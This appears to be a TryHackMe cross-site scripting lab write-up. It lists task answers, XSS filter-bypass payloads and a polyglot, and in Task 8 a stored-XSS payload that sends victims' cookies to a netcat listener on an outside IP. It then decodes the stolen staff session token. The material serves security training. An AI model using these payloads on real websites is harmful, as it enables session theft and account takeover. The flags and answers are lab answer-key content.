# THM - Cross-site Scripting

<br>

## Task 2

### Task 2.1

> document.cookie

### Task 2.2

> alert

<br>

## Task 3

### Task 3.1

> Parameters 

<br>

## Task 4

### Task 4.1

> database

<br>

## Task 5

### Task 5.1

> eval()

<br>

## Task 6

### Task 6.1

> xsshunter

### Task 6.2

> stored XSS

<br>

## Task 7

https://10-10-167-206.p.thmlabs.com/

Input Lvl 1: 
```html
<script>alert('THM');</script>
```

<br>

Input Lvl 2: 
```html
"><script>alert('THM');</script>
```

<br>

Input Lvl 3: 
```html
</textarea><script>alert('THM');</script>
```

<br>

Input Lvl 4: 
```javascript
';alert('THM');//
```

<br>

Input Lvl 5: 
```html
<sscriptcript>alert('THM');</sscriptcript>
```

<br>

Input Lvl 6: 
```html
/images/cat.jpg" onload="alert('THM');
```

<br>

### Task 7.1

> THM{XSS_MASTER}

Polyglots:
```text
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

<br>

## Task 8

https://10-10-40-33.p.thmlabs.com/customers/tickets

Input:
```html
</textarea>test
```

```html
</textarea><script>alert('THM');</script>
```

<br>

```shell
nc -nlvp 9876
```

Input:
```html
</textarea><script>fetch('http://10.10.46.155:9876/?cookie=' + btoa(document.cookie) );</script>
```

```shell
echo c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ== | base64 -d
```

### Task 8.1

> 4AB305E55955197693F01D6F8FD2D321